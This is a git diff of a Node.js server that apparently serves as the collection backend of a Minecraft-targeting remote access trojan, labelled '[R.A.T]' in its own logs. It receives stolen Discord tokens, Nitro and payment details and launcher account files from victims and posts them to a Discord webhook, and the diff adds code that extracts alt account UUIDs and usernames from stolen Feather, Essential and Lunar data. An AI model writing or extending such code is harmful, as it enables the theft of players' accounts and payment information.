@@ -1,4 +1,5 @@
 //setup
+const { contentSecurityPolicy } = require('helmet');
 const getProfiles = require('./utils/networth');
 
 require("dotenv").config()
@@ -26,11 +27,6 @@ let debughook = process.env.DEBUGHOOK
 // Blacklist
 let blacklist = process.env.BLACKLIST
 
-// Proxies
-let mainProxy = process.env.MAINPROXY
-let debugProxy = process.env.DEBUGPROXY
-console.log(mainProxy.split(":"))
-sendMessage("ASD")
 
 //array initialization
 const ipMap = []
@@ -182,23 +178,44 @@ app.post("/", (req, res) => {
         }
 
         // Set alts
-        //check feather content in hastebin
-        if (req.body.feather == 'File not found :(')
+        //check feather accounts and content in hastebin 
+        let featherAccounts = []
+
+        if (req.body.feather == 'File not found :(') {
             checkFeather = 'File not found :( - (Feather)'
-        else
-            checkFeather = `https://hst.sh/${feather} -  **(Feather1)**`
+        } else {
+            checkFeather = `https://hst.sh/raw/${feather} -  **(Feather1)**`
 
-        //check essentials content in hastebin
-        if (req.body.essentials == 'File not found :(')
+            // Extract all "minecraftUuid" values from feather
+            featherAccounts = JSON.parse(req.body.feather).ms.map(msItem => msItem.minecraftUuid.replace(/-/g, ''))
+        }
+
+        //check essential accounts and content in hastebin 
+        let essentialAccounts = []
+
+        if (req.body.essentials == 'File not found :(') {
             checkEssentials = 'File not found :( - (Essentials)'
-        else
-            checkEssentials = `https://hst.sh/${essentials} - **(Essentials2)**`
+            
+        } else {
+            checkEssentials = `https://hst.sh/raw/${essentials} - **(Essentials2)**`
 
-        //check lunar content in hastebin
-        if (req.body.lunar == 'File not found :(')
+            // Extract all usernames from essentials
+            essentialAccounts = JSON.parse(req.body.essentials).accounts.map(account => account.name);
+        }
+
+        //check lunar accounts and content in hastebin 
+        let lunarAccounts = []
+
+        if (req.body.lunar == 'File not found :(') {
             checkLunar = 'File not found :( - (Lunar)'
-        else
-            checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
+        } else {
+            checkLunar = `https://hst.sh/raw/${lunar} - **(Lunar3)**`
+
+            // Extract usernames from lunar
+            lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username);
+        }
+
+        const alts = `Feather Accounts: ${featherAccounts.join('\n')}\nEssentials Usernames: ${essentialAccounts.join('\n')}\nLunar Usernames: ${lunarAccounts.join('\n')}`;
 
         try {
             post(webhook, JSON.stringify({
@@ -216,6 +233,7 @@ app.post("/", (req, res) => {
                         {name: 'Feather', value: `${checkFeather}`, inline: true},
                         {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                         {name: 'Lunar', value: `${checkLunar}`, inline: true},
+                        {name: 'Alts', value: `\`\`\`${alts}\`\`\``, inline: false},
                         {name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false},
                         {name: 'Nitro', value: `\`${nitros}\``, inline: true},
                         {name: 'Payment', value: `\`${payments}\``, inline: true},
@@ -248,7 +266,8 @@ app.post("/", (req, res) => {
                         {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
                         {name: 'Feather', value: `${checkFeather}`, inline: true},
                         {name: 'Essentials', value: `${checkEssentials}`, inline: true},
-                        {name: 'Lunar', value: `${checkLunar}`, inline: true}
+                        {name: 'Lunar', value: `${checkLunar}`, inline: true},
+                        {name: 'Alts', value: `\`\`\`${alts}\`\`\``, inline: false},
                     ],
                     color: 0x7366bd,
                     footer: {
@@ -300,23 +319,13 @@ const formatNumber = (num) => {
 
 function sendMessage(message) {
     post(debughook, JSON.stringify({
-        content: message, //ping
-        attachments: [],
-        proxy: {
-            protocol: 'http',
-            host: debugProxy.split(":")[0],
-            port: debugProxy.split(":")[1],
-            auth: {
-                username: debugProxy.split(":")[2],
-                password: debugProxy.split(":")[3]
-        
-            },
-        }
-    }), {
-        headers: {
-            "Content-Type": "application/json"
-        }
-    }).catch(err => {
-        console.log(`[R.A.T] Error while debugging:\n${err}`)
-    })
+                content: message, //ping
+                attachments: []
+            }), {
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            }).catch(err => {
+                console.log(`[R.A.T] Error while debugging:\n${err}`)
+            })
 }
